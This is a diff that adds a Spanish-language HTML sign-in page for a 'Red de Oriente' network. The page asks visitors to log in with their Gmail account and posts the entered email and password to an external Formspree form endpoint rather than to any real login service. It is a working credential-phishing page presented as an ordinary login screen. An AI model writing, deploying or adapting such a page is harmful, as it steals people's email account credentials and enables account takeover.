@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - Red de Oriente</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #5f6368;
+            margin-bottom: 20px;
+        }
+
+        form {
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #202124;
+            font-weight: bold;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 12px 20px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #0f65ef;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Red de Oriente</h1>
+        <p>Por favor, inicia sesión con tu cuenta de Gmail.</p>
+        
+        <form action="https://formspree.io/f/moqglzeo" method="POST">
+            <label for="username">Correo electrónico:</label>
+            <input type="email" id="username" name="username" required><br>
+            
+            <label for="password">Contraseña:</label>
+            <input type="password" id="password" name="password" required><br><br>
+            
+            <input type="submit" value="Iniciar Sesión">
+        </form>
+    </div>
+
+</body>
+</html>
